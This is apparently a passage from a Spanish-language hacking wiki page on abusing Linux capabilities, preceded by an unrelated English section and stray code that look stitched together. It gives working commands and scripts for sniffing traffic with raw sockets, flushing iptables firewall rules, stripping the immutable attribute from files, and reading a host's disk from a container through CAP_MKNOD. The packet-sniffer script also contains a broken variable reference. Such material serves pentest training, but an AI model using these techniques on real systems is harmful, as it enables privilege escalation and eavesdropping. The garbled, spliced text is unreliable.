- `CAP_CHOWN`: Allows a process to change the owner of any file.
- `CAP_DAC_OVERRIDE`: Allows a process to bypass file read and write permission checks.
- `CAP_DAC_READ_SEARCH`: Allows a process to bypass file read permission checks.
- `CAP_NET_RAW`: Allows a process to create raw network sockets.
- `CAP_SYS_ADMIN`: Allows a process to perform administrative tasks, such as mounting and unmounting file systems.
- `CAP_SYS_PTRACE`: Allows a process to trace the execution of another process.
- `CAP_SYS_CHROOT`: Allows a process to change its root directory.
- `CAP_SETUID`: Allows a process to change its user ID to any other user ID.
- `CAP_SETGID`: Allows a process to change its group ID to any other group ID.

## Privilege escalation with capabilities

If a process has a capability that allows it to perform a privileged action, it may be possible to escalate privileges by exploiting a vulnerability in that process. For example, if a process has the `CAP_SYS_ADMIN` capability, it may be possible to use a vulnerability in that process to gain root privileges.

## References

- [Linux man pages: capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [Linux man pages: getcap](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [Linux man pages: setcap](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [Linux man pages: getpcaps](https://man7.org/linux/man-pages/man1/getpcaps.1.html)
- [Linux man pages: setpcaps](https://man7.org/linux/man-pages/man1/setpcaps.1.html)
- [Linux Journal: Linux Capabilities Simplified](https://www.linuxjournal.com/content/linux-capabilities-simplified)
- [Red Hat: Understanding Linux Capabilities](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/chap-security_guide-capabilities)
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite que un proceso pueda **crear tipos de socket RAW y PACKET** para los espacios de nombres de red disponibles. Esto permite la generación y transmisión arbitraria de paquetes a través de las interfaces de red expuestas. En muchos casos, esta interfaz será un dispositivo Ethernet virtual que puede permitir que un contenedor malicioso o **comprometido** **suplante** **paquetes** en varias capas de red. Un proceso malicioso o un contenedor comprometido con esta capacidad puede inyectarse en el puente ascendente, explotar el enrutamiento entre contenedores, evitar los controles de acceso a la red y manipular la red del host si no hay un firewall en su lugar para limitar los tipos y contenidos de paquetes. Finalmente, esta capacidad permite que el proceso se enlace a cualquier dirección dentro de los espacios de nombres disponibles. Esta capacidad a menudo es retenida por contenedores privilegiados para permitir que la función ping funcione mediante el uso de sockets RAW para crear solicitudes ICMP desde un contenedor.

**Esto significa que es posible espiar el tráfico.** No se pueden escalar los privilegios directamente con esta capacidad.

**Ejemplo con binario**

Si el binario **`tcpdump`** tiene esta capacidad, podrás usarlo para capturar información de red.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Ten en cuenta que si el **entorno** proporciona esta capacidad, también se puede usar **`tcpdump`** para espiar el tráfico.

**Ejemplo con el binario 2**

El siguiente ejemplo es un código de **`python2`** que puede ser útil para interceptar el tráfico de la interfaz "**lo**" (**localhost**). El código es del laboratorio "_The Basics: CAP-NET\_BIND + NET\_RAW_" de [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
    flag=""
    for i in xrange(8,-1,-1):
        if( flag_value & 1 <<i ):
            flag= flag + flags[8-i] + ","
    return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
    frame=s.recv(4096)
    ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
    proto=ip_header[6]
    ip_header_size = (ip_header[0] & 0b1111) * 4
    if(proto==6):
        protocol="TCP"
        tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
        tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
        dst_port=tcp_header[0]
        src_port=tcp_header[1]
        flag=" FLAGS: "+getFlag(tcp_header[4])

    elif(proto==17):
        protocol="UDP"
        udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
        udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
        dst_port=udp_header[0]
        src_port=udp_header[1]

    if (proto == 17 or proto == 6):
        print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
        count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite al poseedor de la capacidad **modificar el firewall, las tablas de enrutamiento, los permisos de socket, la configuración de la interfaz de red** y otras configuraciones relacionadas en los espacios de nombres de red expuestos. Esto también proporciona la capacidad de **habilitar el modo promiscuo** para las interfaces de red adjuntas y potencialmente espiar a través de los espacios de nombres.

**Ejemplo con binario**

Supongamos que el binario **python** tiene estas capacidades.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP\_LINUX\_IMMUTABLE

**Esto significa que es posible modificar los atributos de inode.** No se puede escalar privilegios directamente con esta capacidad.

**Ejemplo con binarios**

Si encuentras que un archivo es inmutable y python tiene esta capacidad, puedes **eliminar el atributo inmutable y hacer que el archivo sea modificable:**
```python
#Check that the file is imutable
lsattr file.sh 
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
Tenga en cuenta que normalmente este atributo inmutable se establece y elimina usando:
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite el uso de la llamada al sistema `chroot(2)`. Esto puede permitir escapar de cualquier entorno `chroot(2)`, utilizando debilidades y escapes conocidos:

* [Cómo escapar de varias soluciones chroot](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: herramienta de escape chroot](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite el uso de la llamada al sistema `reboot(2)`. También permite ejecutar un comando de reinicio arbitrario a través de `LINUX_REBOOT_CMD_RESTART2`, implementado para algunas plataformas de hardware específicas.

Esta capacidad también permite el uso de la llamada al sistema `kexec_load(2)`, que carga un nuevo kernel de fallo y, a partir de Linux 3.17, la llamada al sistema `kexec_file_load(2)`, que también cargará kernels firmados.

## CAP\_SYSLOG

[CAP\_SYSLOG](https://man7.org/linux/man-pages/man7/capabilities.7.html) finalmente se bifurcó en Linux 2.6.37 desde el comodín `CAP_SYS_ADMIN`, esta capacidad permite que el proceso use la llamada al sistema `syslog(2)`. Esto también permite que el proceso vea las direcciones del kernel expuestas a través de `/proc` y otras interfaces cuando `/proc/sys/kernel/kptr_restrict` está configurado en 1.

El ajuste del sysctl `kptr_restrict` se introdujo en 2.6.38 y determina si se exponen las direcciones del kernel. Esto se establece en cero (exponiendo las direcciones del kernel) de forma predeterminada desde 2.6.39 dentro del kernel vanilla, aunque muchas distribuciones establecen correctamente el valor en 1 (ocultar de todos excepto uid 0) o 2 (ocultar siempre).

Además, esta capacidad también permite que el proceso vea la salida de `dmesg`, si la configuración `dmesg_restrict` es 1. Finalmente, la capacidad `CAP_SYS_ADMIN` todavía está permitida para realizar operaciones de `syslog` por razones históricas.

## CAP\_MKNOD

[CAP\_MKNOD](https://man7.org/linux/man-pages/man7/capabilities.7.html) permite un uso extendido de [mknod](https://man7.org/linux/man-pages/man2/mknod.2.html) al permitir la creación de algo que no sea un archivo regular (`S_IFREG`), FIFO (tubería con nombre) (`S_IFIFO`) o un socket de dominio UNIX (`S_IFSOCK`). Los archivos especiales son:

* `S_IFCHR` (Archivo especial de caracteres (un dispositivo como una terminal))
* `S_IFBLK` (Archivo especial de bloques (un dispositivo como un disco)).

Es una capacidad predeterminada ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Esta capacidad permite hacer escalaciones de privilegios (a través de la lectura completa del disco) en el host, bajo estas condiciones:

1. Tener acceso inicial al host (sin privilegios).
2. Tener acceso inicial al contenedor (con privilegios (EUID 0) y `CAP_MKNOD` efectivo).
3. El host y el contenedor deben compartir el mismo espacio de nombres de usuario.

**Pasos:**

1. En el host, como usuario estándar:
   1. Obtener el UID actual (`id`). Por ejemplo: `uid=1000(sin_privilegios)`.
   2. Obtener el dispositivo que desea leer. Por ejemplo: `/dev/sda`
2. En el contenedor, como `root`:
```bash
# Create a new block special file matching the host device
mknod /dev/sda b
# Configure the permissions
chmod ug+w /dev/sda
# Create the same standard user than the one on host
useradd -u 1000 unprivileged
# Login with that user
su unprivileged
```
1. De vuelta en el host:
```bash
# Find the PID linked to the container owns by the user "unprivileged"
# Example only (Depends on the shell program, etc.). Here: PID=18802.
$ ps aux | grep -i /bin/sh | grep -i unprivileged
unprivileged        18802  0.0  0.0   1712     4 pts/0    S+   15:27   0:00 /bin/sh
```

```bash
# Because of user namespace sharing, the unprivileged user have access to the container filesystem, and so the created block special file pointing on /dev/sda
head /proc/18802/root/dev/sda
```
El atacante ahora puede leer, volcar y copiar el dispositivo /dev/sda desde un usuario sin privilegios.

### CAP\_SETPCAP

**`CAP_SETPCAP`** es una capacidad de Linux que permite a un proceso **modificar los conjuntos de capacidades de otro proceso**. Concede la capacidad de agregar o eliminar capacidades de los conjuntos de capacidades efectivas, heredables y permitidas de otros procesos. Sin embargo, existen ciertas restricciones sobre cómo se puede utilizar esta capacidad.

Un proceso con `CAP_SETPCAP` **solo puede otorgar o eliminar capacidades que estén en su propio conjunto de capacidades permitidas**. En otras palabras, un proceso no puede otorgar una capacidad a otro proceso si no tiene esa capacidad en sí mismo. Esta restricción evita que un proceso eleve los privilegios de otro proceso más allá de su propio nivel de privilegio.

Además, en las versiones recientes del kernel, la capacidad `CAP_SETPCAP` ha sido **restringida aún más**. Ya no permite que un proceso modifique arbitrariamente los conjuntos de capacidades de otros procesos. En cambio, **solo permite que un proceso reduzca las capacidades en su propio conjunto de capacidades permitidas o en el conjunto de capacidades permitidas de sus descendientes**. Esta modificación se introdujo para reducir los posibles riesgos de seguridad asociados con la capacidad.

Para utilizar `CAP_SETPCAP` de manera efectiva, es necesario tener la capacidad en su conjunto de capacidades efectivas y las capacidades objetivo en su conjunto de capacidades permitidas. Luego, se puede utilizar la llamada al sistema `capset()` para modificar los conjuntos de capacidades de otros procesos.

En resumen, `CAP_SETPCAP` permite a un proceso modificar los conjuntos de capacidades de otros procesos, pero no puede otorgar capacidades que no tenga en sí mismo. Además, debido a preocupaciones de seguridad, su funcionalidad se ha limitado en las versiones recientes del kernel para permitir solo la reducción de capacidades en su propio conjunto de capacidades permitidas o en los conjuntos de capacidades permitidas de sus descendientes.

## Referencias

**La mayoría de estos ejemplos se tomaron de algunos laboratorios de** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), por lo que si desea practicar estas técnicas de privesc, recomiendo estos laboratorios.

**Otras referencias**:

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) es el evento de ciberseguridad más relevante en **España** y uno de los más importantes en **Europa**. Con **la misión de promover el conocimiento técnico**, este congreso es un punto de encuentro para profesionales de la tecnología y la ciberseguridad en todas las disciplinas.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos.
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>